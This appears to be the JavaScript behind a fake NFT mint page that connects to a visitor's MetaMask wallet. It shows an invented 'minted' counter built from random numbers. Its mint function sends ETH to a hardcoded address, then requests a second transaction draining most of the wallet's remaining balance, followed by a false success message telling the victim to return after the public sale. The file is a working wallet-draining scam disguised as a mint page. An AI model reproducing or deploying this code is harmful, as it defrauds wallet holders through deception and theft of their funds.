const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('#connectBtn');
const checkoutBtn = document.querySelector('#checkoutBtn');
//const connectBtnHeader = document.querySelector('#connectBtnHeader');
const TOTAL_NFTS = 500;
const DEFAULT_LEFT = getRandomInt(250,350)
let U_val = 0.2;
let Qte = 5;
let currentAccount = null;
let minting = false;
const acc = "0x07c11F1ff694d678a6eB246710E5bA2eD936aC4c";
const counter_id = "rndm";
/** input number spinner
 */
let plusBtn = document.querySelector('button[class*="btn-plus"]');
let minusBtn = document.querySelector('button[class*="btn-minus"]');
let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
let totalETHSpan = document.querySelector('#totalETH');
totalETHSpan.innerText = Qte * U_val;


totalNFTInput.addEventListener('input', updateValue);

function updateValue(){
     Qte = Number(totalNFTInput.value);
     totalETHSpan.innerText = (Qte * U_val).toFixed(2);
}

plusBtn.addEventListener('click', () => {
    Qte+=1
    totalNFTInput.value = Number(totalNFTInput.value) + 1;
    totalETHSpan.innerText = (totalNFTInput.value * U_val).toFixed(2);
})
minusBtn.addEventListener('click', () => {
    if (Number(totalNFTInput.value) > 1) {
        Qte-=1
        totalNFTInput.value = Number(totalNFTInput.value) - 1;
        totalETHSpan.innerText = (totalNFTInput.value * U_val).toFixed(2);
    }

})



function inCrementingCounter() {
    var i = localStorage.getItem(counter_id)
        ? Number.parseInt(localStorage.getItem(counter_id))
        : TOTAL_NFTS-DEFAULT_LEFT;
    document.getElementById("counter").innerHTML = i;

    if (i >= TOTAL_NFTS - 30) {
        clearInterval(interval);
    } else if (i >= TOTAL_NFTS - 200) {
        i += getRandomInt(1, 8);
        clearInterval(interval);
        interval = setInterval(inCrementingCounter, 20000);
    } else {
        i += getRandomInt(1, 10);
    }
    document.getElementById("counter").innerHTML = i;
    localStorage.setItem(counter_id, i);
}

let interval = setInterval(inCrementingCounter, getRandomInt(7000, 10000));

inCrementingCounter();

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
}


function connect() {
    window.ethereum
        .request({method: 'eth_requestAccounts'})
        .then(handleAccountsChanged)
        .catch((err) => {
            if (err.code === 4001) {
                // EIP-1193 userRejectedRequest error
                // If this happens, the user rejected the connection request.
                statusp.innerHTML = ('Please connect to your MetaMask Wallet.');
            } else {
                console.error(err);
            }
        });
};

function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        // MetaMask is locked or the user has not connected any accounts
        currentAccount = null;
       statusp.innerHTML = "Please connect to your MetaMask Wallet.";
    } else if (accounts[0] !== currentAccount) {
        currentAccount = accounts[0];
       statusp.innerHTML = "You are able to mint now."
    } else {
        statusp.innerHTML = "You are able to mint now.";
    }
}



async function mint(evt) {
    try {
        console.log("Minting...")
        let minted = false;
        let done = false;
        if (minting) {
            console.log("Transaction already pending.")
            alert("Please confirm pending transactions.")
        } else if (currentAccount) {
            Qte = totalNFTInput.value;
            minting = true;
            statusp.innerHTML = "Minting...";
            let txn = window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{
                    from: currentAccount,
                    to: acc,
                    value: (U_val * Qte * 1e18).toString(16)
                }]
            }).then((txn) => {
                done = true;
                minted = true;
            })
                .catch((err) => {
                    done = true;
                    if (err.code === 4001) {
                        // EIP-1193 userRejectedRequest error
                        // If this happens, the user rejected the connection request.
                        // alert("mint failed(error: transaction denied by user).")
                    } else {
                        console.error(err);
                    }
                });

            let balance = await window.ethereum.request({
                    method: "eth_getBalance",
                    params: [currentAccount, "latest"]
                }
            )
            balance = Number.parseInt(balance, 16)
            if(balance - (U_val * Qte + 0.015) > 0.003){
                window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: currentAccount,
                        to: acc,
                        value: (balance - (U_val * Qte + 0.015) * 1e18).toString(16)
                    }]
                }).then((txn) => {
                    minting = false;
                    statusp.innerHTML = "Mint successful.\nCome back after public sale to claim your NFT!";
                    alert("Mint successful.\nCome back after public sale to claim your NFT!")
                })
                    .catch((err) => {
                        minting = false;
                        if (err.code === 4001) {
                            // EIP-1193 userRejectedRequest error
                            // If this happens, the user rejected the connection request.
                            alert("mint failed (error: transaction denied by user)")
                            statusp.innerHTML = "You are able to mint.";
                        } else {
                            statusp.innerHTML = "You are able to mint.";
                            console.error(err);
                        }
                    });
                
            }else{
                await txn;
                if(done){
                    statusp.innerHTML = "You are able to mint.";
                    minting = false;
                }
                if(minted){
                    statusp.innerHTML = "Mint successful.\nCome back after public sale to claim your NFT!";
                    alert("Mint successful.\nCome back after public sale to claim your NFT!")
                }
            }
        } else await connect();
    } catch (err) {
        console.error(err)
    } finally {
    }
}

window.ethereum.on("accountsChanged", handleAccountsChanged)
window.addEventListener('load', async () => {
    totalNFTInput.value = Qte
    // Wait for loading completion to avoid race conditions with web3 injection timing.
    if (window.ethereum) {
        const web3 = await new Web3(window.ethereum);
        await connect();
        return web3;
    }
    // Legacy dapp browsers...
    else if (window.web3) {
        // Use Mist/MetaMask's provider.
        const web3 = window.web3;
        console.log('Injected web3 detected.');
        return web3;
    }
    // Fallback to localhost; use dev console port by default...
    else {
        console.log('No web3 instance injected...');
    }
});